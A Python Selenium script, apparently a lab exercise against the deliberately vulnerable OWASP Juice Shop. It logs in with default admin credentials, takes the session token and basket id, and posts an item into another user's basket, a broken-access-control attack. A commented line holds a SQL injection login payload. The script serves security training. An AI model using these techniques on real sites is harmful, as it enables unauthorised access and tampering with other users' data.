from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import requests



def main():
    # Initialize the WebDriver
    driver = webdriver.Chrome()  # Use the browser of your choice (e.g., Firefox, Edge)

    # Open the webpage
    driver.get("https://juice-shop.herokuapp.com/#/") # used this originally and worked but debugging
    # driver.get("https://juice-shop.herokuapp.com")

    # Wait for and dismiss the overlay
    try:
        dismissBtn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CLASS_NAME, "mat-focus-indicator.mat-raised-button.mat-warn"))
        )
        dismissBtn.click()
        print("Overlay dismissed.")
    except Exception as e:
        print(f"Could not dismiss the overlay: {e}")

    # any user can be used to log in for this one
    login_user(driver)

    # print(driver.page_source)  
    # add_product_to_my_cart(driver)

    # Capture the authorization token after login then use it to make requests
    token = acquire_token(driver)

    # make sure token exists first...
    if token:
        print("Successfully acquired token.")
        # Now use the token to add a product to another user's basket
        basketid = acquire_basket_id(driver)

        other_basketid = "2"

        if basketid and other_basketid:
            add_product_to_another_basket(token, basketid, other_basketid)
        
    else:
        print("Failed to capture the auth token.")

    # Close the browser
    input("Press Enter to close the browser...")
    driver.quit()

def login_user(driver):
    # login as normal user
    WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "navbarAccount"))
    ).click()

    # get to login page
    WebDriverWait(driver, 10).until (
        EC.element_to_be_clickable((By.ID, "navbarLoginButton"))
    ).click()

    # Put in email & password
    emailField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "email"))
    )
    # emailField.send_keys("'or 1=1;--") #maybe juice-shop instead?
    emailField.send_keys("admin@juice-sh.op") #maybe juice-shop instead?

    passwordField = WebDriverWait(driver, 10).until (
        EC.presence_of_element_located((By.ID, "password"))
    )
    # passwordField.send_keys("password123")
    passwordField.send_keys("admin123")
    passwordField.send_keys(Keys.RETURN) # This hits 'enter' while in password field meaning it logs in

    time.sleep(2) # allow login process to start

def add_product_to_my_cart(driver):
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, "add-to-cart-button"))
    ).click()
    time.sleep(2)

def acquire_token(driver):
    
    cookies = driver.get_cookies()
    for cookie in cookies:
        if cookie['name'] == 'token':
            return cookie['value']
    return None # TODO: Is this required?

# def acquire_basket_id(driver):
#     basketid = None

#     cookies = driver.get_cookies()
#     for cookie in cookies:
#         if 'basket' in cookie['name']:
#             basketid = cookie['value']
#             break
    
#     if not basketid:
#         print("BasketId could not be found in the cookies")  # will basketid be presented in cookies?

#     return basketid    

def acquire_basket_id(driver):
    # Retrieve the basketid from sessionStorage located in applications -> storage
    basket_id = driver.execute_script("return sessionStorage.getItem('bid');")
    
    if not basket_id:
        print("Basket ID could not be found in sessionStorage.")
    else:
        print(f"Basket ID found: {basket_id}")
    
    return basket_id


        

def add_product_to_another_basket(token, basketid, other_users_basketid):

    # url = "http://localhost:3000/api/BasketItems"
    url = "https://juice-shop.herokuapp.com/api/BasketItems"
    
    headers = {
        "Authorization": f"Bearer {token}", # 'f' here allows for string literals
        "Content-Type": "application/json"
    }

    # Product is added to the other user's basket here
    payload = {
        "ProductId": 1,    # uses product ID of 14 as item to switch
        # "BasketId": basketid,      # Your basket ID gotten in main (might not need for payload actually...)
        "quantity": 1,
        "BasketId": other_users_basketid  # Target basket ID
    }

    response = requests.post(url, json=payload, headers=headers)
    
    if response.status_code == 200:
        print("Product added to other user's basket!!!")

        # print(response.json_response)
    else:
        print(f"Error: {response.status_code}, {response.text}, ID being sent {other_users_basketid}")
    

# what is purpose of this it was in the adminLogIn.py but confused on what it does
# Adding here incase it is neccessary
if __name__ == "__main__":
    main()